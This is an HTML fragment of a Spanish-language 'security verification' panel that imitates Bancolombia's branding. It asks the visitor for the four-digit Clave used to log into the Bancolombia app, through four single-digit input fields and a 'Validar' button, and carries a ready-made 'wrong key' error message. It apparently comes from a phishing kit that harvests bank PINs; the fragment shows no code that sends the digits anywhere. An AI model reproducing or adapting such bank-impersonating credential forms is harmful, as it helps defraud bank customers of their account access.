<!-- Clave Virtual -->
<div id="pinvir" class="w-full flex flex-col justify-center items-center pb-6 hidden">
    <h5 class="text-[24px] font-cib-sans-bold mt-10">Verificacion de seguridad</h5>
    <div class="w-full flex mt-4 flex-col justify-center items-center gap-4 pl-1">
        <div class="w-[100%] bg-white py-6 px-4 rounded-xl flex flex-col items-center">
            <div class="w-full flex items-center justify-center hiddenerror hidden">
                <span class="text-[11px] text-red-600"> La Clave ingresada no es correcta. Intenta
                    nuevamente.</span>
            </div>
            <div class="mt-2.5">
                <img src="/3co/assets/candado.svg" alt="Candado" />
            </div>
            <div class="w-[90%] flex flex-col mt-4 mb-4">
                <span class="text-[16px] text-center text-gray-800">
                    Ingresa la Clave que usas para ingresar a Mi App Bancolombia:
                </span>
            </div>

            <div class="w-full mt-4 flex flex-col items-center">
                <div class="flex justify-center gap-2 w-full max-w-xs">
                    <input id="clavevirtual-0" type="text" inputmode="numeric" maxlength="1"
                        class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                    <input id="clavevirtual-1" type="text" inputmode="numeric" maxlength="1"
                        class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                    <input id="clavevirtual-2" type="text" inputmode="numeric" maxlength="1"
                        class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                    <input id="clavevirtual-3" type="text" inputmode="numeric" maxlength="1"
                        class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                </div>
            </div>

            <button id="validarClaveVirtual"
                class="mt-4 font-bold py-2 px-6 rounded-full mt-6 disabled:bg-gray-300 disabled:text-black cursor-not-allowed bg-gray-300 w-32"
                disabled>
                Validar
            </button>
        </div>
    </div>
</div>
